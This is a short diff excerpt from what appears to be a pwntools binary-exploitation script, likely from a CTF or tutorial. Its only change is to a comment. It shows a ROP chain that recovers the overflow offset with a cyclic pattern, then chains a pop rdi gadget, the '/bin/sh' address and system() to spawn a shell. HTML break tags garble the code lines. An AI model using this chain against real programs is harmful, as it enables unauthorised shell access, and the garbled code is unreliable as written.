@@ -281,7 +281,7 @@ from pwn import *
  
 # read 4 bytes from the stack pointer # this is our De Bruijn offset pattern = core.read(stack, 4) offset = <br>cyclic_find(pattern) info("pattern: %r", pattern) 
  
-# build the rop chain # first we will return onto our pop gadget which will pop the next element on the stack, the <br>address of our '/bin/sh' string # then the return of that gadget pops the next address, which is our system call, and executes it<br> rop_chain = p64(pop_rdi, endian="little") 
+# build the rop chain # first we will return onto our pop gadget which will pop the next element on the stack, the <br>address of our '/bin/sh' string # then the return of that gadget pops the next address, which is our system call,<br> and executes it: rop_chain = p64(pop_rdi, endian="little") 
 
 rop_chain += p64(bin_sh, endian="little") rop_chain += p64(system, endian="little") 
  
